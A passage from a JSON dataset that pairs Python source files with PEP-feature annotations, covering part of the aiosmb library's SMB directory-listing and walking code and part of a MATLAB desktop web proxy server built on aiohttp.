FileAttributes.FILE_ATTRIBUTE_DIRECTORY:\n\t\t\t\t\t\tdirname = info.FileName \n\t\t\t\t\t\tif info.FileName in ['.','..']:\n\t\t\t\t\t\t\tcontinue\n\t\t\t\t\t\tsubdir = SMBDirectory()\n\t\t\t\t\t\tsubdir.tree_id = self.tree_id\n\t\t\t\t\t\tif self.fullpath != '':\n\t\t\t\t\t\t\tsubdir.fullpath = '%s\\\\%s' % (self.fullpath, info.FileName)\t\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tsubdir.fullpath = info.FileName\n\t\t\t\t\t\tsubdir.unc_path = '%s\\\\%s' % (self.unc_path, info.FileName)\n\t\t\t\t\t\tsubdir.parent_dir = self\n\t\t\t\t\t\tsubdir.name = info.FileName\n\t\t\t\t\t\tsubdir.creation_time = info.CreationTime\n\t\t\t\t\t\tsubdir.last_access_time = info.LastAccessTime\n\t\t\t\t\t\tsubdir.last_write_time = info.LastWriteTime\n\t\t\t\t\t\tsubdir.change_time = info.ChangeTime\n\t\t\t\t\t\tsubdir.allocation_size = info.AllocationSize\n\t\t\t\t\t\tsubdir.attributes = info.FileAttributes\n\t\t\t\t\t\tyield subdir, 'dir', None\n\t\t\t\t\telse:\n\t\t\t\t\t\tfile = SMBFile()\n\t\t\t\t\t\tfile.tree_id = self.tree_id\n\t\t\t\t\t\tfile.parent_dir = None\n\t\t\t\t\t\tif self.fullpath != '':\n\t\t\t\t\t\t\tfile.fullpath = '%s\\\\%s' % (self.fullpath, info.FileName)\n\t\t\t\t\t\t\tfile.unc_path = '%s\\\\%s' % (self.unc_path, info.FileName)\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tfile.fullpath = info.FileName\n\t\t\t\t\t\t\tfile.unc_path = '%s\\\\%s' % (self.unc_path, info.FileName)\n\t\t\t\t\t\tfile.name = info.FileName\n\t\t\t\t\t\tfile.size = info.EndOfFile\n\t\t\t\t\t\tfile.creation_time = info.CreationTime\n\t\t\t\t\t\tfile.last_access_time = info.LastAccessTime\n\t\t\t\t\t\tfile.last_write_time = info.LastWriteTime\n\t\t\t\t\t\tfile.change_time = info.ChangeTime\n\t\t\t\t\t\tfile.allocation_size = info.AllocationSize\n\t\t\t\t\t\tfile.attributes = info.FileAttributes\n\t\t\t\t\t\tyield file, 'file', None\n\t\texcept Exception as e:\n\t\t\tyield self, 'dir', e\n\t\t\treturn\n\t\tfinally:\n\t\t\tif file_id is not None:\n\t\t\t\tawait connection.close(self.tree_id, file_id)\n\tasync def list(self, connection:SMBConnection):\n\t\tself.files = {}\n\t\tself.subdirs = {}\n\t\tdesired_access = FileAccessMask.FILE_READ_DATA\n\t\tshare_mode = ShareAccess.FILE_SHARE_READ\n\t\tcreate_options = CreateOptions.FILE_DIRECTORY_FILE | CreateOptions.FILE_SYNCHRONOUS_IO_NONALERT\n\t\tfile_attrs = 0\n\t\tcreate_disposition = CreateDisposition.FILE_OPEN\n\t\tif not self.tree_id:\n\t\t\ttree_entry, err = await connection.tree_connect(self.get_share_path())\n\t\t\tif err is not None:\n\t\t\t\traise err\n\t\t\tself.tree_id = tree_entry.tree_id\n\t\tfile_id, err = await connection.create(self.tree_id, self.fullpath, desired_access, share_mode, create_options, create_disposition, file_attrs)\n\t\tif err is not None:\n\t\t\treturn False, err\n\t\ttry:\n\t\t\twhile True:\n\t\t\t\tfileinfos, err = await connection.query_directory(self.tree_id, file_id)\n\t\t\t\tif err is not None:\n\t\t\t\t\traise err\n\t\t\t\tif not fileinfos:\n\t\t\t\t\tbreak\n\t\t\t\tfor info in fileinfos:\n\t\t\t\t\tif info.FileAttributes & FileAttributes.FILE_ATTRIBUTE_DIRECTORY:\n\t\t\t\t\t\tdirname = info.FileName \n\t\t\t\t\t\tif info.FileName in ['.','..']:\n\t\t\t\t\t\t\tcontinue\n\t\t\t\t\t\tsubdir = SMBDirectory()\n\t\t\t\t\t\tsubdir.tree_id = self.tree_id\n\t\t\t\t\t\tif self.fullpath != '':\n\t\t\t\t\t\t\tsubdir.fullpath = '%s\\\\%s' % (self.fullpath, info.FileName)\t\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tsubdir.fullpath = info.FileName\n\t\t\t\t\t\tsubdir.unc_path = '%s\\\\%s' % (self.unc_path, info.FileName)\n\t\t\t\t\t\tsubdir.parent_dir = self\n\t\t\t\t\t\tsubdir.name = info.FileName\n\t\t\t\t\t\tsubdir.creation_time = info.CreationTime\n\t\t\t\t\t\tsubdir.last_access_time = info.LastAccessTime\n\t\t\t\t\t\tsubdir.last_write_time = info.LastWriteTime\n\t\t\t\t\t\tsubdir.change_time = info.ChangeTime\n\t\t\t\t\t\tsubdir.allocation_size = info.AllocationSize\n\t\t\t\t\t\tsubdir.attributes = info.FileAttributes\n\t\t\t\t\t\tself.subdirs[subdir.name] = subdir\n\t\t\t\t\telse:\n\t\t\t\t\t\tfile = SMBFile()\n\t\t\t\t\t\tfile.tree_id = self.tree_id\n\t\t\t\t\t\tfile.parent_dir = None\n\t\t\t\t\t\tif self.fullpath != '':\n\t\t\t\t\t\t\tfile.fullpath = '%s\\\\%s' % (self.fullpath, info.FileName)\n\t\t\t\t\t\t\tfile.unc_path = '%s\\\\%s' % (self.unc_path, info.FileName)\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tfile.fullpath = info.FileName\n\t\t\t\t\t\t\tfile.unc_path = '%s\\\\%s' % (self.unc_path, info.FileName)\n\t\t\t\t\t\tfile.name = info.FileName\n\t\t\t\t\t\tfile.size = info.EndOfFile\n\t\t\t\t\t\tfile.creation_time = info.CreationTime\n\t\t\t\t\t\tfile.last_access_time = info.LastAccessTime\n\t\t\t\t\t\tfile.last_write_time = info.LastWriteTime\n\t\t\t\t\t\tfile.change_time = info.ChangeTime\n\t\t\t\t\t\tfile.allocation_size = info.AllocationSize\n\t\t\t\t\t\tfile.attributes = info.FileAttributes\t\t\n\t\t\t\t\t\tself.files[file.name] = file\n\t\t\treturn True, None\n\t\texcept Exception as e:\n\t\t\treturn False, e\n\t\tfinally:\n\t\t\tif file_id is not None:\n\t\t\t\tawait connection.close(self.tree_id, file_id)\n\tdef __str__(self):\n\t\tt = '===== DIRECTORY ===== \\r\\n'\n\t\tfor k in self.__dict__:\n\t\t\tif k.startswith('parent_'):\n\t\t\t\tcontinue\n\t\t\tif isinstance(self.__dict__[k], list):\n\t\t\t\tfor item in self.__dict__[k]:\n\t\t\t\t\tt += '%s : %s\\r\\n' % (k, item)\n\t\t\telif isinstance(self.__dict__[k], dict):\n\t\t\t\tfor ks in self.__dict__[k]:\n\t\t\t\t\tt += '%s : %s\\r\\n' % (ks, self.__dict__[k][ks])\n\t\t\telse:\n\t\t\t\tt += '%s : %s\\r\\n' % (k, self.__dict__[k])\n\t\treturn t\nasync def smb_mkdir(path:str, connection = None):\n\tif path.lower().startswith('smb'):\n\t\t\tfrom aiosmb.commons.connection.factory import SMBConnectionFactory\n\t\t\tfactory = SMBConnectionFactory.from_url(path)\n\t\t\tif connection is None:\n\t\t\t\tconnection = factory.get_connection()\n\t\t\t\tasync with connection:\n\t\t\t\t\t_, err = await connection.login()\n\t\t\t\t\tif err is not None:\n\t\t\t\t\t\traise err\n\t\t\t\t\tsmbdir = factory.get_directory()\n\t\t\t\t\t_, err = await smbdir.create_remote(connection, smbdir.fullpath)\n\t\t\t\t\tif err is not None:\n\t\t\t\t\t\traise err\n\t\t\t\t\treturn\n\t\t\telse:\n\t\t\t\tsmbdir = factory.get_directory()\n\t\t\t\t_, err = await smbdir.create_remote(connection, smbdir.fullpath)\n\t\t\t\tif err is not None:\n\t\t\t\t\traise err\n\t\t\t\treturn\n\telse:\n\t\tsmbdir = SMBDirectory.from_remotepath(connection, path)\n\t\t_, err = await smbdir.create_remote(connection, smbdir.fullpath)\n\t\tif err is not None:\n\t\t\traise err\nasync def smb_rmdir(path:str, connection = None):\n\tif path.lower().startswith('smb'):\n\t\t\tfrom aiosmb.commons.connection.factory import SMBConnectionFactory\n\t\t\tfactory = SMBConnectionFactory.from_url(path)\n\t\t\tif connection is None:\n\t\t\t\tconnection = factory.get_connection()\n\t\t\t\tasync with connection:\n\t\t\t\t\t_, err = await connection.login()\n\t\t\t\t\tif err is not None:\n\t\t\t\t\t\traise err\n\t\t\t\t\tsmbdir = factory.get_directory()\n\t\t\t\t\t_, err = await smbdir.delete(connection)\n\t\t\t\t\tif err is not None:\n\t\t\t\t\t\traise err\n\t\t\t\t\treturn\n\t\t\telse:\n\t\t\t\tsmbdir = factory.get_directory()\n\t\t\t\t_, err = await smbdir.delete(connection)\n\t\t\t\tif err is not None:\n\t\t\t\t\traise err\n\t\t\t\treturn\n\telse:\n\t\tsmbdir = SMBDirectory.from_remotepath(connection, path)\n\t\t_, err = await smbdir.delete(connection)\n\t\tif err is not None:\n\t\t\traise err\nasync def smb_walk(path:str, connection = None, fullpath = False):\n\tasync def _walk(smbdir:SMBDirectory, connection, fullpath):\n\t\t_, err = await smbdir.list(connection)\n\t\tif err is None:\n\t\t\tyield smbdir, smbdir.get_subdir_paths(fullpath), smbdir.get_file_paths(fullpath)\n\t\t\tfor subdir in smbdir.subdirs:\n\t\t\t\tasync for x in _walk(smbdir.subdirs[subdir], connection, fullpath):\n\t\t\t\t\tyield x\n\tif path.lower().startswith('smb'):\n\t\t\tfrom aiosmb.commons.connection.factory import SMBConnectionFactory\n\t\t\tfactory = SMBConnectionFactory.from_url(path)\n\t\t\tif connection is None:\n\t\t\t\tconnection = factory.get_connection()\n\t\t\t\tasync with connection:\n\t\t\t\t\t_, err = await connection.login()\n\t\t\t\t\tif err is not None:\n\t\t\t\t\t\traise err\n\t\t\t\t\tsmbdir = factory.get_directory()\n\t\t\telse:\n\t\t\t\tsmbdir = factory.get_directory()\n\telse:\n\t\tsmbdir = SMBDirectory.from_remotepath(connection, path)\n\tasync for smbdir, subdirs, files in _walk(smbdir, connection, fullpath):\n\t\tyield smbdir, subdirs, files\nasync def amain():\n\turl = 'smb2+ntlm-password://TEST\\\\Administrator:Passw0rd!1@10.10.10.2/C$'\n\tfrom aiosmb.commons.connection.factory import SMBConnectionFactory\n\tconnection = SMBConnectionFactory.from_url(url).get_connection()\n\t_, err = await connection.login()\n\tif err is not None:\n\t\traise err\n\tasync for smbdir, subdirs, files in smb_walk(url, connection, fullpath=True):\n\t\tprint(smbdir.fullpath)\n\t\tprint(subdirs)\n\t\tprint(files)\n\t\tprint('')\nif __name__ == '__main__':\n\timport asyncio\n\tasyncio.run(amain())",
            "patterns": {
                "pep_526": [
                    [
                        16,
                        "self.tree_id:int = None"
                    ],
                    [
                        17,
                        "self.fullpath:str = None"
                    ],
                    [
                        18,
                        "self.unc_path:str = None"
                    ],
                    [
                        20,
                        "self.name:str = None"
                    ],
                    [
                        21,
                        "self.creation_time:datetime.datetime = None"
                    ],
                    [
                        22,
                        "self.last_access_time:datetime.datetime = None"
                    ],
                    [
                        23,
                        "self.last_write_time:datetime.datetime = None"
                    ],
                    [
                        24,
                        "self.change_time:datetime.datetime = None"
                    ],
                    [
                        25,
                        "self.allocation_size:datetime.datetime = None"
                    ],
                    [
                        26,
                        "self.attributes:FileAttributes = None"
                    ],
                    [
                        27,
                        "self.file_id:int = None"
                    ],
                    [
                        29,
                        "self.files:Dict[str, SMBFile] = {}"
                    ],
                    [
                        30,
                        "self.subdirs:Dict[str, SMBDirectory] = {}"
                    ]
                ],
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ],
                    [
                        481,
                        481,
                        "import",
                        "\timport asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        1,
                        "from typing import Dict, List",
                        "suggestion"
                    ],
                    [
                        1,
                        "from typing import Dict, List",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        29,
                        "\t\tself.files:Dict[str, SMBFile] = {}",
                        "violation"
                    ],
                    [
                        30,
                        "\t\tself.subdirs:Dict[str, SMBDirectory] = {}",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        444,
                        467,
                        "async generator",
                        "async def smb_walk(path:str, connection = None, fullpath = False):\n\tasync def _walk(smbdir:SMBDirectory, connection, fullpath):\n\t\t_, err = await smbdir.list(connection)\n\t\tif err is None:\n\t\t\tyield smbdir, smbdir.get_subdir_paths(fullpath), smbdir.get_file_paths(fullpath)\n\t\t\tfor subdir in smbdir.subdirs:\n\t\t\t\tasync for x in _walk(smbdir.subdirs[subdir], connection, fullpath):\n\t\t\t\t\tyield x\n\tif path.lower().startswith('smb'):\n\t\t\tfrom aiosmb.commons.connection.factory import SMBConnectionFactory\n\t\t\tfactory = SMBConnectionFactory.from_url(path)\n\t\t\tif connection is None:\n\t\t\t\tconnection = factory.get_connection()\n\t\t\t\tasync with connection:\n\t\t\t\t\t_, err = await connection.login()\n\t\t\t\t\tif err is not None:\n\t\t\t\t\t\traise err\n\t\t\t\t\tsmbdir = factory.get_directory()\n\t\t\telse:\n\t\t\t\tsmbdir = factory.get_directory()\n\telse:\n\t\tsmbdir = SMBDirectory.from_remotepath(connection, path)\n\tasync for smbdir, subdirs, files in _walk(smbdir, connection, fullpath):\n\t\tyield smbdir, subdirs, files"
                    ],
                    [
                        206,
                        236,
                        "async generator",
                        "async def list_r(self, connection:SMBConnection, depth:int = 3, maxentries:int = None, fetch_dir_sd:bool = False, fetch_file_sd:bool = False, exclude_dir:List[str] = [], filter_cb=None):\n\t\tif depth == 0:\n\t\t\treturn\n\t\tdepth -= 1\n\t\tctr = 0\n\t\ttry:\n\t\t\tasync for obj, otype, err in self.list_gen(connection):\n\t\t\t\tawait asyncio.sleep(0)\n\t\t\t\tif otype == 'dir' and fetch_dir_sd is True and obj.name not in exclude_dir:\n\t\t\t\t\tobj.tree_id = self.tree_id\n\t\t\t\t\t_, err = await obj.get_security_descriptor(connection)\n\t\t\t\tif otype == 'file' and fetch_file_sd is True:\n\t\t\t\t\tobj.tree_id = self.tree_id\n\t\t\t\t\t_, err = await obj.get_security_descriptor(connection)\n\t\t\t\tyield obj, otype, err\n\t\t\t\tctr += 1\n\t\t\t\tif err is not None:\n\t\t\t\t\tbreak\n\t\t\t\tif ctr == maxentries:\n\t\t\t\t\tyield self, 'maxed', None\n\t\t\t\t\tbreak\n\t\t\t\tif otype == 'dir' and obj.name not in exclude_dir:\n\t\t\t\t\tif filter_cb is not None:\n\t\t\t\t\t\tres = await filter_cb('dir', obj)\n\t\t\t\t\t\tif res is False:\n\t\t\t\t\t\t\tcontinue\n\t\t\t\t\tobj.tree_id = self.tree_id\n\t\t\t\t\tasync for e,t,err in obj.list_r(connection, depth, maxentries = maxentries, exclude_dir = exclude_dir):\n\t\t\t\t\t\tyield e,t,err\n\t\texcept Exception as e:\n\t\t\tyield None, None, e"
                    ],
                    [
                        237,
                        308,
                        "async generator",
                        "async def list_gen(self, connection:SMBConnection):\n\t\tself.files = {}\n\t\tself.subdirs = {}\n\t\tdesired_access = FileAccessMask.FILE_READ_DATA\n\t\tshare_mode = ShareAccess.FILE_SHARE_READ\n\t\tcreate_options = CreateOptions.FILE_DIRECTORY_FILE | CreateOptions.FILE_SYNCHRONOUS_IO_NONALERT\n\t\tfile_attrs = 0\n\t\tcreate_disposition = CreateDisposition.FILE_OPEN\n\t\tif not self.tree_id:\n\t\t\ttree_entry, err = await connection.tree_connect(self.get_share_path())\n\t\t\tif err is not None:\n\t\t\t\tyield self, 'dir', err\n\t\t\t\treturn\n\t\t\tself.tree_id = tree_entry.tree_id\n\t\tfile_id, err = await connection.create(self.tree_id, self.fullpath, desired_access, share_mode, create_options, create_disposition, file_attrs)\n\t\tif err is not None:\n\t\t\tyield self, 'dir', err\n\t\t\treturn\n\t\ttry:\n\t\t\twhile True:\n\t\t\t\tawait asyncio.sleep(0)\n\t\t\t\tfileinfos, err = await connection.query_directory(self.tree_id, file_id)\n\t\t\t\tif err is not None:\n\t\t\t\t\traise err\n\t\t\t\tif not fileinfos:\n\t\t\t\t\tbreak\n\t\t\t\tfor info in fileinfos:\n\t\t\t\t\tif info.FileAttributes & FileAttributes.FILE_ATTRIBUTE_DIRECTORY:\n\t\t\t\t\t\tdirname = info.FileName \n\t\t\t\t\t\tif info.FileName in ['.','..']:\n\t\t\t\t\t\t\tcontinue\n\t\t\t\t\t\tsubdir = SMBDirectory()\n\t\t\t\t\t\tsubdir.tree_id = self.tree_id\n\t\t\t\t\t\tif self.fullpath != '':\n\t\t\t\t\t\t\tsubdir.fullpath = '%s\\\\%s' % (self.fullpath, info.FileName)\t\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tsubdir.fullpath = info.FileName\n\t\t\t\t\t\tsubdir.unc_path = '%s\\\\%s' % (self.unc_path, info.FileName)\n\t\t\t\t\t\tsubdir.parent_dir = self\n\t\t\t\t\t\tsubdir.name = info.FileName\n\t\t\t\t\t\tsubdir.creation_time = info.CreationTime\n\t\t\t\t\t\tsubdir.last_access_time = info.LastAccessTime\n\t\t\t\t\t\tsubdir.last_write_time = info.LastWriteTime\n\t\t\t\t\t\tsubdir.change_time = info.ChangeTime\n\t\t\t\t\t\tsubdir.allocation_size = info.AllocationSize\n\t\t\t\t\t\tsubdir.attributes = info.FileAttributes\n\t\t\t\t\t\tyield subdir, 'dir', None\n\t\t\t\t\telse:\n\t\t\t\t\t\tfile = SMBFile()\n\t\t\t\t\t\tfile.tree_id = self.tree_id\n\t\t\t\t\t\tfile.parent_dir = None\n\t\t\t\t\t\tif self.fullpath != '':\n\t\t\t\t\t\t\tfile.fullpath = '%s\\\\%s' % (self.fullpath, info.FileName)\n\t\t\t\t\t\t\tfile.unc_path = '%s\\\\%s' % (self.unc_path, info.FileName)\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tfile.fullpath = info.FileName\n\t\t\t\t\t\t\tfile.unc_path = '%s\\\\%s' % (self.unc_path, info.FileName)\n\t\t\t\t\t\tfile.name = info.FileName\n\t\t\t\t\t\tfile.size = info.EndOfFile\n\t\t\t\t\t\tfile.creation_time = info.CreationTime\n\t\t\t\t\t\tfile.last_access_time = info.LastAccessTime\n\t\t\t\t\t\tfile.last_write_time = info.LastWriteTime\n\t\t\t\t\t\tfile.change_time = info.ChangeTime\n\t\t\t\t\t\tfile.allocation_size = info.AllocationSize\n\t\t\t\t\t\tfile.attributes = info.FileAttributes\n\t\t\t\t\t\tyield file, 'file', None\n\t\texcept Exception as e:\n\t\t\tyield self, 'dir', e\n\t\t\treturn\n\t\tfinally:\n\t\t\tif file_id is not None:\n\t\t\t\tawait connection.close(self.tree_id, file_id)"
                    ],
                    [
                        445,
                        451,
                        "async generator",
                        "async def _walk(smbdir:SMBDirectory, connection, fullpath):\n\t\t_, err = await smbdir.list(connection)\n\t\tif err is None:\n\t\t\tyield smbdir, smbdir.get_subdir_paths(fullpath), smbdir.get_file_paths(fullpath)\n\t\t\tfor subdir in smbdir.subdirs:\n\t\t\t\tasync for x in _walk(smbdir.subdirs[subdir], connection, fullpath):\n\t\t\t\t\tyield x"
                    ],
                    [
                        466,
                        467,
                        "async for",
                        "async for smbdir, subdirs, files in _walk(smbdir, connection, fullpath):\n\t\tyield smbdir, subdirs, files"
                    ],
                    [
                        475,
                        479,
                        "async for",
                        "async for smbdir, subdirs, files in smb_walk(url, connection, fullpath=True):\n\t\tprint(smbdir.fullpath)\n\t\tprint(subdirs)\n\t\tprint(files)\n\t\tprint('')"
                    ],
                    [
                        212,
                        234,
                        "async for",
                        "async for obj, otype, err in self.list_gen(connection):\n\t\t\t\tawait asyncio.sleep(0)\n\t\t\t\tif otype == 'dir' and fetch_dir_sd is True and obj.name not in exclude_dir:\n\t\t\t\t\tobj.tree_id = self.tree_id\n\t\t\t\t\t_, err = await obj.get_security_descriptor(connection)\n\t\t\t\tif otype == 'file' and fetch_file_sd is True:\n\t\t\t\t\tobj.tree_id = self.tree_id\n\t\t\t\t\t_, err = await obj.get_security_descriptor(connection)\n\t\t\t\tyield obj, otype, err\n\t\t\t\tctr += 1\n\t\t\t\tif err is not None:\n\t\t\t\t\tbreak\n\t\t\t\tif ctr == maxentries:\n\t\t\t\t\tyield self, 'maxed', None\n\t\t\t\t\tbreak\n\t\t\t\tif otype == 'dir' and obj.name not in exclude_dir:\n\t\t\t\t\tif filter_cb is not None:\n\t\t\t\t\t\tres = await filter_cb('dir', obj)\n\t\t\t\t\t\tif res is False:\n\t\t\t\t\t\t\tcontinue\n\t\t\t\t\tobj.tree_id = self.tree_id\n\t\t\t\t\tasync for e,t,err in obj.list_r(connection, depth, maxentries = maxentries, exclude_dir = exclude_dir):\n\t\t\t\t\t\tyield e,t,err"
                    ],
                    [
                        450,
                        451,
                        "async for",
                        "async for x in _walk(smbdir.subdirs[subdir], connection, fullpath):\n\t\t\t\t\tyield x"
                    ],
                    [
                        233,
                        234,
                        "async for",
                        "async for e,t,err in obj.list_r(connection, depth, maxentries = maxentries, exclude_dir = exclude_dir):\n\t\t\t\t\t\tyield e,t,err"
                    ]
                ],
                "pep_498v": [
                    [
                        164,
                        164,
                        "%"
                    ],
                    [
                        168,
                        168,
                        "%"
                    ],
                    [
                        183,
                        183,
                        "%"
                    ],
                    [
                        385,
                        385,
                        "%"
                    ],
                    [
                        390,
                        390,
                        "%"
                    ],
                    [
                        274,
                        274,
                        "%"
                    ],
                    [
                        343,
                        343,
                        "%"
                    ],
                    [
                        388,
                        388,
                        "%"
                    ],
                    [
                        271,
                        271,
                        "%"
                    ],
                    [
                        289,
                        289,
                        "%"
                    ],
                    [
                        290,
                        290,
                        "%"
                    ],
                    [
                        293,
                        293,
                        "%"
                    ],
                    [
                        340,
                        340,
                        "%"
                    ],
                    [
                        358,
                        358,
                        "%"
                    ],
                    [
                        359,
                        359,
                        "%"
                    ],
                    [
                        362,
                        362,
                        "%"
                    ]
                ]
            }
        },
        "85": {
            "file": "import sys\nimport os\nimport aiohttp\nimport asyncio\nimport json\nimport pkgutil\nimport mimetypes\nfrom aiohttp import web\nfrom matlab_desktop_proxy import settings\nfrom matlab_desktop_proxy import mwi_environment_variables as mwi_env\nfrom matlab_desktop_proxy import util\nfrom matlab_desktop_proxy.app_state import AppState\nfrom matlab_desktop_proxy.util import mwi_logger\nfrom matlab_desktop_proxy.util.mwi_exceptions import LicensingError\nfrom matlab_desktop_proxy.util import mwi_validators\nfrom matlab_desktop_proxy.default_config import default_config\nmimetypes.add_type(\"font/woff\", \".woff\")\nmimetypes.add_type(\"font/woff2\", \".woff2\")\nmimetypes.add_type(\"font/eot\", \".eot\")\nmimetypes.add_type(\"font/ttf\", \".ttf\")\nmimetypes.add_type(\"application/json\", \".map\")\nmimetypes.add_type(\"image/png\", \".ico\")\ndef marshal_licensing_info(licensing_info):\n    if licensing_info is None:\n        return None\n    if licensing_info[\"type\"] == \"mhlm\":\n        return {\n            \"type\": \"MHLM\",\n            \"emailAddress\": licensing_info[\"email_addr\"],\n            \"entitlements\": licensing_info.get(\"entitlements\", []),\n            \"entitlementId\": licensing_info.get(\"entitlement_id\", None),\n        }\n    elif licensing_info[\"type\"] == \"nlm\":\n        return {\n            \"type\": \"NLM\",\n            \"connectionString\": licensing_info[\"conn_str\"],\n        }\ndef marshal_error(error):\n    if error is None:\n        return None\n    return {\n        \"message\": error.message,\n        \"logs\": error.logs,\n        \"type\": error.__class__.__name__,\n    }\ndef create_status_response(app, loadUrl=None):\n    state = app[\"state\"]\n    return web.json_response(\n        {\n            \"matlab\": {\n                \"status\": state.get_matlab_state(),\n                \"version\": state.settings[\"matlab_version\"],\n            },\n            \"licensing\": marshal_licensing_info(state.licensing),\n            \"loadUrl\": loadUrl,\n            \"error\": marshal_error(state.error),\n            \"wsEnv\": state.settings[\"ws_env\"],\n        }\n    )\nasync def get_env_config(req):\n    config = req.app[\"state\"].env_config\n    return web.json_response(config)\nasync def get_status(req):\n    return create_status_response(req.app)\nasync def start_matlab(req):\n    state = req.app[\"state\"]\n    await state.start_matlab(restart_matlab=True)\n    return create_status_response(req.app)\nasync def stop_matlab(req):\n    state = req.app[\"state\"]\n    await state.stop_matlab()\n    return create_status_response(req.app)\nasync def set_licensing_info(req):\n    state = req.app[\"state\"]\n    data = await req.json()\n    lic_type = data.get(\"type\")\n    try:\n        if lic_type == \"NLM\":\n            await state.set_licensing_nlm(data.get(\"connectionString\"))\n        elif lic_type == \"MHLM\":\n            await state.set_licensing_mhlm(\n                data.get(\"token\"), data.get(\"emailAddress\"), data.get(\"sourceId\")\n            )\n        else:\n            raise Exception('License type must be \"NLM\" or \"MHLM\"!')\n    except Exception as e:\n        raise web.HTTPBadRequest(text=\"Error with licensing!\")\n    if state.is_licensed() is True and not isinstance(state.error, LicensingError):\n        await state.start_matlab(restart_matlab=True)\n    return create_status_response(req.app)\nasync def licensing_info_delete(req):\n    state = req.app[\"state\"]\n    await state.stop_matlab()\n    state.unset_licensing()\n    state.persist_licensing()\n    return create_status_response(req.app)\nasync def termination_integration_delete(req):\n    state = req.app[\"state\"]\n    res = create_status_response(req.app, \"../\")\n    await res.prepare(req)\n    await res.write_eof()\n    await req.app.shutdown()\n    await req.app.cleanup()\n    if not mwi_env.is_testing_mode_enabled():\n        sys.exit(0)\nasync def root_redirect(request):\n    return aiohttp.web.HTTPFound(\"./index.html\")\nasync def static_get(req):\n    details = req.app[\"static_route_table\"][req.path]\n    return web.Response(\n        headers=details[\"headers\"],\n        status=200,\n        body=pkgutil.get_data(details[\"mod\"], details[\"name\"]),\n    )\ndef make_static_route_table(app):\n    from pkg_resources import resource_listdir, resource_isdir\n    from matlab_desktop_proxy import gui\n    from matlab_desktop_proxy.gui import static\n    from matlab_desktop_proxy.gui.static import css\n    from matlab_desktop_proxy.gui.static import js\n    from matlab_desktop_proxy.gui.static import media\n    base_url = app[\"settings\"][\"base_url\"]\n    table = {}\n    for (mod, parent) in [\n        (gui.__name__, \"\"),\n        (gui.static.__name__, \"/static\"),\n        (gui.static.css.__name__, \"/static/css\"),\n        (gui.static.js.__name__, \"/static/js\"),\n        (gui.static.media.__name__, \"/static/media\"),\n    ]:\n        for name in resource_listdir(mod, \"\"):\n            if not resource_isdir(mod, name):\n                if name != \"__init__.py\":\n                    if \"manifest.json\" in name:\n                        content_type = \"application/manifest+json\"\n                    else:\n                        content_type = mimetypes.guess_type(name)[0]\n                    headers = {\"content-type\": content_type}\n                    headers.update(app[\"settings\"][\"mwi_custom_http_headers\"])\n                    table[f\"{base_url}{parent}/{name}\"] = {\n                        \"mod\": mod,\n                        \"name\": name,\n                        \"headers\": headers,\n                    }\n    return table\nasync def matlab_view(req):\n    reqH = req.headers.copy()\n    state = req.app[\"state\"]\n    matlab_port = state.matlab_port\n    matlab_protocol = req.app[\"settings\"][\"matlab_protocol\"]\n    mwapikey = req.app[\"settings\"][\"mwapikey\"]\n    matlab_base_url = f\"{matlab_protocol}://localhost:{matlab_port}\"\n    if (\n        reqH.get(\"connection\") == \"Upgrade\"\n        and reqH.get(\"upgrade\") == \"websocket\"\n        and req.method == \"GET\"\n    ):\n        ws_server = web.WebSocketResponse()\n        await ws_server.prepare(req)\n        async with aiohttp.ClientSession(\n            cookies=req.cookies, connector=aiohttp.TCPConnector(verify_ssl=False)\n        ) as client_session:\n            async with client_session.ws_connect(\n                matlab_base_url + req.path_qs,\n            ) as ws_client:\n                async def wsforward(ws_from, ws_to):\n                    async for msg in ws_from:\n                        mt = msg.type\n                        md = msg.data\n                        if mt == aiohttp.WSMsgType.TEXT:\n                            await ws_to.send_str(md)\n                        elif mt == aiohttp.WSMsgType.BINARY:\n                            await ws_to.send_bytes(md)\n                        elif mt == aiohttp.WSMsgType.PING:\n                            await ws_to.ping()\n                        elif mt == aiohttp.WSMsgType.PONG:\n                            await ws_to.pong()\n                        elif ws_to.closed:\n                            await ws_to.close(code=ws_to.close_code, message=msg.extra)\n                        else:\n                            raise ValueError(f\"Unexpected message type: {msg}\")\n                await asyncio.wait(\n                    [wsforward(ws_server, ws_client), wsforward(ws_client, ws_server)],\n                    return_when=asyncio.FIRST_COMPLETED,\n                )\n                return ws_server\n    else:\n        async with aiohttp.ClientSession(\n            connector=aiohttp.TCPConnector(verify_ssl=False),\n        ) as client_session:\n            try:\n                req_body = await transform_body(req)\n                reqH[\"Content-Length\"] = str(len(req_body))\n                reqH[\"x-forwarded-proto\"] = \"http\"\n                async with client_session.request(\n                    req.method,\n                    f\"{matlab_base_url}{req.rel_url}\",\n                    headers={**reqH, **{\"mwapikey\": mwapikey}},\n                    allow_redirects=False,\n                    data=req_body,\n                ) as res:\n                    headers = res.headers.copy()\n                    body = await res.read()\n                    headers.update(req.app[\"settings\"][\"mwi_custom_http_headers\"])\n                    return web.Response(headers=headers, status=res.status, body=body)\n            except Exception:\n                raise web.HTTPNotFound()\nasync def transform_body(req):\n    body = await req.read()\n    if req.method == \"POST\" and req.rel_url.path.endswith(\"messageservice/json/secure\"):\n        data = json.loads(body)\n        try:\n            replace = False\n            for client_type in data[\"messages\"][\"ClientType\"]:\n                if client_type[\"properties\"][\"TYPE\"] == \"jsd\":\n                    client_type[\"properties\"][\"TYPE\"] = \"jsd_rmt_tmw\"\n                    replace = True\n            if replace is True:\n                body = json.dumps(data)\n        except KeyError:\n            pass\n    return body\nasync def license_init(app):\n    state = app[\"state\"]\n    try:\n        await state.init_licensing()\n    except asyncio.CancelledError:\n        pass\nasync def matlab_starter(app):\n    state = app[\"state\"]\n    try:\n        if state.is_licensed() and state.get_matlab_state() == \"down\":\n            await state.start_matlab()\n    except asyncio.CancelledError:\n        await state.stop_matlab()\nasync def start_background_tasks(app):\n    await license_init(app)\n    await matlab_starter(app)\nasync def cleanup_background_tasks(app):\n    logger = mwi_logger.get()\n    state = app[\"state\"]\n    tasks = state.tasks\n    for task_name, task in tasks.items():\n        if not task.cancelled():\n            